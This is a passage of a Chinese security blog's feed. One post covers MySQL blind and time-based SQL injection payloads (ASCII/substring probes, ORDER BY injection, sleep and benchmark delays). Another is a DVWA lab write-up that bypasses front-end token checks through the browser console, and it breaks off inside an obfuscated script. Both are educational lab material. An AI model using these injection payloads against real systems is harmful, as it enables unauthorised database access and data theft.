class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">IN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">48&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">49&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">50&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">51&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">52&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">53&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这样就能完全避免注入的SQL里包含&lt;code>'&lt;/code>，对过滤 &lt;code>'&lt;/code>的 WAF 大概会有用。&lt;/p>
&lt;p>此外其他的返回布尔值的函数多少在合适的地方还是能一战的吧。&lt;/p>
&lt;h3 id="order-by">order by&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ORDER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">BY&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="k">IF&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ASCII&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">VERSION&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">53&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>注入点在 &lt;code>order by&lt;/code> 子句的时候比较有用。&lt;/p>
&lt;h3 id="find_in_set">find_in_set&lt;/h3>
&lt;p>这个就是纯 trick 了。用 &lt;code>find_in_set&lt;/code> 可以一次判断更大的范围，减少请求次数。比如原本测试字符串一位就要跑字母表26个字母，算上大小写直接翻倍。&lt;code>find_in_set&lt;/code>可以用的话就能实现二分法搜索，时间复杂度骤降。&lt;/p>
&lt;h2 id="time-based-sql-injection">Time based SQL injection&lt;/h2>
&lt;p>也叫 &lt;em>double blind SQL injection&lt;/em>， 双盲指的是就连SQL执行结果都看不到。不管传什么都返回完全相同的页面。这种情况只能靠请求时间来判断了。&lt;/p>
&lt;h3 id="sleep">sleep&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">version&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">like&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;5%&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">sleep&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">false&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>不必多解释了吧。&lt;/p>
&lt;h3 id="benchmark">benchmark&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">benchmark&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">10000000&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">now&lt;/span>&lt;span class="p">()));&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这种做法叫 &lt;code>heavy queries&lt;/code>，就是给MySQL一个压力很大的查询，让MySQL花更长时间执行。除了 &lt;code>benchmark&lt;/code> 之外还可以用 cross join ，求两个大表的笛卡尔积。cross join 时算法类似下面这样：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="k">for&lt;/span> &lt;span class="nx">r1&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">table1&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">r2&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">table2&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">results&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">results&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">pair&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">r2&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>计算量等于两个表行数的积。不过前提是要知道表名，最少知道自己的表名，起码还能 JOIN 自己。如果数据量太少的话这个方法产生的返回时间差不够明显，就不能用了。&lt;/p>
&lt;h2 id="参考">参考&lt;/h2>
&lt;ul>
&lt;li>&lt;a class="link" href="https://dev.mysql.com/doc/refman/5.7/en/json-function-reference.html" target="_blank" rel="noopener"
>MySQL 5.7 Manual - JSON function reference&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://phonexicum.github.io/infosec/sql-injection.html" target="_blank" rel="noopener"
>phonexicum.github.io SQLi&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="思考">思考&lt;/h2>
&lt;p>red tiger 的 level 1 和 level 2 真的很简单。选择正确的位置注入就能直接 pass，不需要考虑 bypass WAF，没有 trick。&lt;/p>
&lt;p>level 3 开始就比较狗了，提示 try to get an error，但这句话不是让你往 error based SQL injection 的方向想，我就给带歪了，还想着怎么制造个能回显的注入 payload ，实际上根本不是这个意思。正确的方向是 制造一个 &lt;strong>PHP的错误&lt;/strong>，解密 &lt;code>usr&lt;/code> 这个参数。&lt;/p>
&lt;p>具体就不说了，总之制造 PHP 的错误也需要动 &lt;code>usr&lt;/code> ，我给的关键词是 type error，提示很明显了。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>以上，玩得开心。&lt;/p></description></item><item><title>DVWA上手记录-JavaScript</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-13/</link><pubDate>Fri, 29 Apr 2022 13:54:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-13/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>DVWA最后一题了。&lt;/p>
&lt;h2 id="原理">原理&lt;/h2>
&lt;p>没有原理。&lt;/p>
&lt;blockquote>
&lt;p>The attacks in this section are designed to help you learn about how JavaScript is used in the browser and how it can be manipulated. The attacks could be carried out by just analysing network traffic, but that isn&amp;rsquo;t the point and it would also probably be a lot harder.&lt;/p>
&lt;/blockquote>
&lt;p>本质是 bypass 各种前端的检查或加密、签名。大概在搞爬虫的时候会很有用。&lt;/p>
&lt;h2 id="解题">解题&lt;/h2>
&lt;h3 id="low收集信息">Low：收集信息&lt;/h3>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429105107549.png"
width="565"
height="314"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429105107549_hu9daeddfd3ca22563562aedd5fbd0a4a9_25683_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429105107549_hu9daeddfd3ca22563562aedd5fbd0a4a9_25683_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429105107549"
class="gallery-image"
data-flex-grow="179"
data-flex-basis="431px"
>&lt;/p>
&lt;p>直接点击 Submit 看看。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429105121988.png"
width="361"
height="152"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429105121988_hu773c3bdfcfb056538ee60eafc7063435_10325_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429105121988_hu773c3bdfcfb056538ee60eafc7063435_10325_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429105121988"
class="gallery-image"
data-flex-grow="237"
data-flex-basis="570px"
>&lt;/p>
&lt;p>修改为 &lt;code>success&lt;/code> 再点击 Submit 看看。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429105144340.png"
width="329"
height="149"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429105144340_hu00ac5d38523128528b7881462b329a16_9830_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429105144340_hu00ac5d38523128528b7881462b329a16_9830_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429105144340"
class="gallery-image"
data-flex-grow="220"
data-flex-basis="529px"
>&lt;/p>
&lt;p>注意到两件事：&lt;/p>
&lt;ol>
&lt;li>&lt;code>phrase&lt;/code> 是明文。&lt;/li>
&lt;li>&lt;code>token&lt;/code> 一直不变。&lt;/li>
&lt;/ol>
&lt;p>所以初步怀疑题意是逆向出 &lt;code>token&lt;/code> 的算法，让 &lt;code>phrase&lt;/code> 和 &lt;code>token&lt;/code> 匹配以通过检查。后来看帮助确实如此。&lt;/p>
&lt;p>提取出前端相关js。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">function&lt;/span> &lt;span class="nx">generate_token&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">phrase&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;phrase&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;token&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">md5&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">rot13&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">phrase&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">generate_token&lt;/span>&lt;span class="p">();&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>这个脚本运行后设置&lt;code>token&lt;/code>的值，运行肯定是比人看到页面早的。&lt;/p>
&lt;h3 id="low解题">Low：解题&lt;/h3>
&lt;p>输入框填好 &lt;code>success&lt;/code>，然后直接在开发者工具控制台里跑一次 &lt;code>generate_token()&lt;/code> 就行了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429105911315.png"
width="462"
height="165"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429105911315_hua396ff1b8a1cb16b0f9d229120153b07_12010_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429105911315_hua396ff1b8a1cb16b0f9d229120153b07_12010_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429105911315"
class="gallery-image"
data-flex-grow="280"
data-flex-basis="672px"
>&lt;/p>
&lt;h3 id="medium收集信息">Medium：收集信息&lt;/h3>
&lt;p>UI上和Low难度没区别。直接看 js 变化。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">function&lt;/span> &lt;span class="nx">do_something&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">t&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">n&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">n&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">n&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">t&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nx">e&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">t&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">setTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">do_elsesomething&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;XX&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">},&lt;/span> &lt;span class="mi">300&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kd">function&lt;/span> &lt;span class="nx">do_elsesomething&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;token&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">do_something&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">getElementById&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;phrase&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">value&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s2">&amp;#34;XX&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>字符串逆转，然后前后加上了 &lt;code>XX&lt;/code>。&lt;/p>
&lt;h3 id="medium解题">Medium：解题&lt;/h3>
&lt;p>填好&lt;code>success&lt;/code>后，直接在控制台运行一次 &lt;code>do_elsesomething(&amp;quot;XX&amp;quot;)&lt;/code> 就完事了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429110421884.png"
width="456"
height="165"
srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429110421884_hu58923c052895d67f321efe7bdb95d4e3_11990_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-13/image-20220429110421884_hu58923c052895d67f321efe7bdb95d4e3_11990_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220429110421884"
class="gallery-image"
data-flex-grow="276"
data-flex-basis="663px"
>&lt;/p>
&lt;h3 id="high-收集信息">High: 收集信息&lt;/h3>
&lt;p>UI还是不变，看脚本，发现做了混淆。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="kd">var&lt;/span> &lt;span class="nx">a&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;fromCharCode&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;toString&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;replace&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;BeJ&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;\x5cw+&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;Lyg&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;SuR&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;(w(){\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\x202L=!1R&amp;amp;&amp;amp;1c\x202M===\x271n\x27;q\x202o=!Y.2S&amp;amp;&amp;amp;1c\x202d===\x271n\x27&amp;amp;&amp;amp;2d.2Q&amp;amp;&amp;amp;2d.2Q.3S;p(2o){Y=3R}z\x20p(2L){Y=2M}q\x202G=!Y.3Q&amp;amp;&amp;amp;1c\x202g===\x271n\x27&amp;amp;&amp;amp;2g.X;q\x202s=1c\x202l===\x27w\x27&amp;amp;&amp;amp;2l.3P;q\x201y=!Y.3H&amp;amp;&amp;amp;1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w];q\x20U=[24,16,8,0];q\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\x201E=[\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27];q\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\x204C.Q.2U.1I(1x)===\x27[1n\x201z]\x27}}p(1y&amp;amp;&amp;amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\x201c\x201x===\x271n\x27&amp;amp;&amp;amp;1x.1w&amp;amp;&amp;amp;1x.1w.1J===Z}}q\x202m=w(1X,x){A\x20w(s){A\x20O\x20N(x,1d).S(s)[1X]()}};q\x202a=w(x){q\x20P=2m(\x271e\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\x20O\x20N(x)};P.S=w(s){A\x20P.1T().S(s)};1g(q\x20i=0;i&amp;lt;1E.W;++i){q\x20T=1E[i];P[T]=2m(T,x)}A\x20P};q\x202P=w(P,x){q\x201S=2O(\x222N(\x271S\x27)\x22);q\x201Y=2O(\x222N(\x271w\x27).1Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s){p(1c\x20s===\x272p\x27){A\x201S.2x(2n).S(s,\x274S\x27).1G(\x271e\x27)}z{p(s===2q||s===2T){1u\x20O\x201t(1l)}z\x20p(s.1J===Z){s=O\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\x201S.2x(2n).S(O\x201Y(s)).1G(\x271e\x27)}z{A\x20P(s)}};A\x202z};q\x202k=w(1X,x){A\x20w(G,s){A\x20O\x201P(G,x,1d).S(s)[1X]()}};q\x202f=w(x){q\x20P=2k(\x271e\x27,x);P.1T=w(G){A\x20O\x201P(G,x)};P.S=w(G,s){A\x20P.1T(G).S(s)};1g(q\x20i=0;i&amp;lt;1E.W;++i){q\x20T=1E[i];P[T]=2k(T,x)}A\x20P};w\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\x202h,T=1c\x20s;p(T!==\x272p\x27){p(T===\x271n\x27){p(s===2q){1u\x20O\x201t(1l)}z\x20p(1y&amp;amp;&amp;amp;s.1J===Z){s=O\x202r(s)}z\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}2h=1d}q\x20r,M=0,i,W=s.W,l=k.l;4t(M&amp;lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&amp;lt;W&amp;amp;&amp;amp;i&amp;lt;1k;++M){l[i&amp;gt;&amp;gt;2]|=s[M]&amp;lt;&amp;lt;U[i++&amp;amp;3]}}z{1g(i=k.1A;M&amp;lt;W&amp;amp;&amp;amp;i&amp;lt;1k;++M){r=s.1Q(M);p(r&amp;lt;R){l[i&amp;gt;&amp;gt;2]|=r&amp;lt;&amp;lt;U[i++&amp;amp;3]}z\x20p(r&amp;lt;2v){l[i&amp;gt;&amp;gt;2]|=(2t|(r&amp;gt;&amp;gt;6))&amp;lt;&amp;lt;U[i++&amp;amp;3];l[i&amp;gt;&amp;gt;2]|=(R|(r&amp;amp;V))&amp;lt;&amp;lt;U[i++&amp;amp;3]}z\x20p(r&amp;lt;2A||r&amp;gt;=2E){l[i&amp;gt;&amp;gt;2]|=(2D|(r&amp;gt;&amp;gt;12))&amp;lt;&amp;lt;U[i++&amp;amp;3];l[i&amp;gt;&amp;gt;2]|=(R|((r&amp;gt;&amp;gt;6)&amp;amp;V))&amp;lt;&amp;lt;U[i++&amp;amp;3];l[i&amp;gt;&amp;gt;2]|=(R|(r&amp;amp;V))&amp;lt;&amp;lt;U[i++&amp;amp;3]}z{r=2C+(((r&amp;amp;23)&amp;lt;&amp;lt;10)|(s.1Q(++M)&amp;amp;23));l[i&amp;gt;&amp;gt;2]|=(2X|(r&amp;gt;&amp;gt;18))&amp;lt;&amp;lt;U[i++&amp;amp;3];l[i&amp;gt;&amp;gt;2]|=(R|((r&amp;gt;&amp;gt;12)&amp;amp;V))&amp;lt;&amp;lt;U[i++&amp;amp;3];l[i&amp;gt;&amp;gt;2]|=(R|((r&amp;gt;&amp;gt;6)&amp;amp;V))&amp;lt;&amp;lt;U[i++&amp;amp;3];l[i&amp;gt;&amp;gt;2]|=(R|(r&amp;amp;